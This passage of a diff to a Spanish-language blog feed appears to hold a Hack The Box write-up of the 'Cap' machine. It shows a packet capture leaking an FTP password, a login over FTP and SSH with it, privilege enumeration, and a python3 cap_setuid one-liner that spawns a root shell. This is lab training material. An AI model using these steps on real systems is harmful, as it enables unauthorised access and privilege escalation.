-08:12:50.406277 IP 192.168.196.1.54410 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 1, win 4106, length 0
-08:12:50.406347 IP 192.168.196.1.54410 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:353, ack 1, win 4106, length 352: HTTP: GET /favicon.ico HTTP/1.1
-08:12:50.406355 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54410: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 353, win 501, length 0
-08:12:50.407862 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54410: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:25, ack 353, win 501, length 24: HTTP: HTTP/1.0 404 NOT FOUND
-08:12:50.408011 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54410: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FP.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;25:394, ack 353, win 501, length 369: HTTP
-08:12:50.408145 IP 192.168.196.1.54410 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 395, win 4104, length 0
-08:12:50.408318 IP 192.168.196.1.54410 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;F.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;353, ack 395, win 4104, length 0
-08:12:50.408331 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54410: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 354, win 501, length 0
-08:12:52.582712 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1619097681, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
-08:12:52.582766 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;455236821, ack 1619097682, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
-08:12:52.583076 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 1, win 4106, length 0
-08:12:52.585037 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:21, ack 1, win 502, length 20: FTP: 220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-08:12:52.625835 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 21, win 4106, length 0
-08:12:54.084642 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:14, ack 21, win 4106, length 13: FTP: USER nathan
-08:12:54.084668 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 14, win 502, length 0
-08:12:54.084772 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;21:55, ack 14, win 502, length 34: FTP: 331 Please specify the password.
-08:12:54.125843 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 55, win 4106, length 0
-08:12:55.383140 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;14:36, ack 55, win 4106, length 22: FTP: PASS Buck3tH4TF0RM3!
-08:12:55.383176 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 36, win 502, length 0
-08:12:55.390529 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;55:78, ack 36, win 502, length 23: FTP: 230 Login successful.
-08:12:55.390943 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;36:42, ack 78, win 4105, length 6: FTP: SYST
-08:12:55.390976 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 42, win 502, length 0
-08:12:55.391079 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;78:97, ack 42, win 502, length 19: FTP: 215 UNIX Type: L8
-08:12:55.436932 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 97, win 4105, length 0
-08:12:56.267770 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;42:70, ack 97, win 4105, length 28: FTP: PORT 192,168,196,1,212,140
-08:12:56.267797 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 70, win 502, length 0
-08:12:56.268016 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;97:148, ack 70, win 502, length 51: FTP: 200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-08:12:56.268656 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;70:76, ack 148, win 4105, length 6: FTP: LIST
-08:12:56.269195 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;148:187, ack 76, win 502, length 39: FTP: 150 Here comes the directory listing.
-08:12:56.269621 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;187:211, ack 76, win 502, length 24: FTP: 226 Directory send OK.
-08:12:56.269782 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 211, win 4105, length 0
-08:12:57.338913 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;76:104, ack 211, win 4105, length 28: FTP: PORT 192,168,196,1,212,141
-08:12:57.339140 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;211:262, ack 104, win 502, length 51: FTP: 200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-08:12:57.339696 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;104:114, ack 262, win 4105, length 10: FTP: LIST &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
-08:12:57.340307 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;262:301, ack 114, win 502, length 39: FTP: 150 Here comes the directory listing.
-08:12:57.340646 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;301:325, ack 114, win 502, length 24: FTP: 226 Directory send OK.
-08:12:57.340779 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 325, win 4104, length 0
-08:13:17.989210 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;114:122, ack 325, win 4104, length 8: FTP: TYPE I
-08:13:17.989363 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;325:356, ack 122, win 502, length 31: FTP: 200 Switching to Binary mode.
-08:13:17.989689 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;122:150, ack 356, win 4104, length 28: FTP: PORT 192,168,196,1,212,143
-08:13:17.989830 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;356:407, ack 150, win 502, length 51: FTP: 200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
-08:13:17.990074 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;150:166, ack 407, win 4104, length 16: FTP: RETR notes.txt
-08:13:17.990214 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;407:433, ack 166, win 502, length 26: FTP: 550 Failed to open file.
-08:13:18.033053 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 433, win 4104, length 0
-08:13:21.085693 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;166:172, ack 433, win 4104, length 6: FTP: QUIT
-08:13:21.085794 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;433:447, ack 172, win 502, length 14: FTP: 221 Goodbye.
-08:13:21.085838 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;F.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;447, ack 172, win 502, length 0
-08:13:21.086194 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 448, win 4104, length 0
-08:13:21.086523 IP 192.168.196.1.54411 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.ftp: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;F.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;172, ack 448, win 4104, length 0
-08:13:21.086530 IP 192.168.196.16.ftp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54411: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 173, win 502, length 0
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En la captura, podemos observa credenciales de acceso por FTP; por lo que se procede a ingresar por dicho protocolo con las credenciales identificadas para validar el acceso.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.245
-Connected to 10.10.10.245.
-220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.245:kamiyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: nathan
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
-Using binary mode to transfer files.
-ftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Así mismo, sabemos que se encuentra abierto el puerto 22, por lo que es posible acceder con las credenciales identificadas y logramos entrar como el usuario &lt;strong&gt;nathan&lt;/strong&gt; y podemos visualizar la flag (user.txt)&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh nathan@10.10.10.245
-nathan@10.10.10.245&lt;span class=&quot;s1&quot;&gt;'s password: 
-Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Thu Aug 26 13:43:25 UTC 2021
-
-  System load:           0.0
-  Usage of /:            36.6% of 8.73GB
-  Memory usage:          20%
-  Swap usage:            0%
-  Processes:             221
-  Users logged in:       0
-  IPv4 address for eth0: 10.10.10.245
-  IPv6 address for eth0: dead:beef::250:56ff:feb9:e88e
-
- * Super-optimized for small spaces - read how we shrank the memory
-   footprint of MicroK8s to make it the smallest full K8s around.
-
-   https://ubuntu.com/blog/microk8s-memory-optimisation
-
-63 updates can be applied immediately.
-42 of these updates are standard security updates.
-To see these additional updates run: apt list --upgradable
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
-nathan@cap:~$ 
-
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora sólo falta escalar privilegios, por lo que empezamos a enumerar el sistema para determinar privilegios cuenta el usuario &lt;strong&gt;nathan&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt; Checkar en que grupos se encuentra el usuario &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-nathan@cap:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nathan&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nathan&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nathan&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt; Checkar archivos que se puedan ejecutar como root &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-nathan@cap:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nathan: 
-Sorry, user nathan may not run &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;on cap.
-nathan@cap:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt; Checkar permisos SUID &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-nathan@cap:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm 4000 2&amp;gt;/dev/null
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt; Checkar capabilities &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-nathan@cap:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getcap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; / 2&amp;gt;/dev/null
-/usr/bin/python3.8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_setuid,cap_net_bind_service+eip
-/usr/bin/ping &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
-/usr/bin/traceroute6.iputils &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
-/usr/bin/mtr-packet &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_bind_service,cap_net_admin+ep
-nathan@cap:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como se puede observar, se tiene &lt;em&gt;cap_setuid&lt;/em&gt; para &lt;em&gt;python3.8&lt;/em&gt;, por lo que mediante el sitio &lt;strong&gt;GTFOBINS&lt;/strong&gt; podemos obtener el comando a ejecutar para escalar privilegios&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/python/#capabilities&quot;&gt;&lt;strong&gt;Gtfobins&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nathan@cap:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
-root
-&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A este punto ya somos usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="IDOR" /><category term="Python" /><category term="Linux" /><category term="Web" /><category term="Network" /><category term="SUID" /><summary type="html">Resolución de la máquina Cap en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;A este punto ya ingresamos a la máquina como &lt;strong&gt;nt authority\system&lt;/strong&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Patch_Management" /><summary type="html">Resolución de la máquina Blue en la plataforma de Hack The Box</summary></entry></feed>
